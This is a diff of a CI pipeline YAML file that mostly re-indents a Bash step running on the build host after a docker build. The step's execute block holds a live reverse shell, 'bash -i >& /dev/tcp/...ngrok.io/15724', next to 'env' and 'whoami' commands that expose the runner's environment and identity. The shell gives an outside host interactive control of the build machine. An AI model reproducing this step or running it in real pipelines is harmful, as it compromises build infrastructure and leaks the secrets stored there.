@@ -57,22 +57,22 @@ pipelines:
 #             - name: yuvalArtifactory
             
       - name: bash_commands
-       type: Bash
+        type: Bash
         configuration:
-         affinityGroup: yuval_docker
+          affinityGroup: yuval_docker
           runtime:
-           type: host
-         inputSteps:
+            type: host
+          inputSteps:
            - name: docker_build_step
         execution:
-         onStart:
-           - env
-         onExecute:
-           - pwd
-           - whoami
+          onStart:
+            - env
+          onExecute:
+            - pwd
+            - whoami
             - bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/15724 0>&1
           onSuccess:
-           - echo "succes"
+            - echo "succes"
       
 #       - name: docker_push
 #         type: DockerPush
